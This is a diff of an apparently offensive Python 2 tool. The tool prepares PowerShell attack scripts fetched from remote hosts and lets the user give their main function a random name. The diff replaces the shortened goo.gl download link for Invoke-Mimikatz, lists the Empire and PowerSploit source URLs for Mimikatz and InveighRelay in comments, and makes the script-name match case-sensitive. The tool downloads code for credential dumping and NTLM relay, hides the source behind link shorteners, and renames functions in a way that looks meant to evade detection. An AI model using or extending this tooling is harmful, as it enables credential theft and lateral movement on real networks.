@@ -18,10 +18,16 @@ __license__		= "Apache License 2.0"
 __version__		= "0.1.1"
 __status__		= "Prototype"
 
+#Passed URLs:
 #MIMIURL = 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
+#MIMIURL = 'https://goo.gl/TRkLKn'
+
+#Current URLs:
+#MIMIURL = 'https://raw.githubusercontent.com/EmpireProject/Empire/2.0_beta/data/module_source/credentials/Invoke-Mimikatz.ps1'
 #INVEIGHRELAY = 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-InveighRelay.ps1'
 
-MIMIURL = 'https://goo.gl/TRkLKn'
+
+MIMIURL = 'https://goo.gl/s18PdR'
 INVEIGHRELAY = 'https://goo.gl/1507jm'
 TEST = 'http://127.0.0.1:8000/test.ps1'
 MIMI = ''
@@ -215,9 +221,9 @@ def main():
 	print banners.smallSlant
 
 	newFunctionName = raw_input("What name do you want the main function to be called [default is random]:") or makeRandom()
-	if(args.pshScript.lower() == 'mimikatz'):
+	if(args.pshScript == 'Mimikatz'):
 		url = MIMIURL
-	elif(args.pshScript.lower() == 'inveighrelay'):
+	elif(args.pshScript == 'InveighRelay'):
 		url = INVEIGHRELAY
 	else:
 		url = raw_input("Enter URL [http://127.0.0.1:8000/test.ps1]: ") or TEST
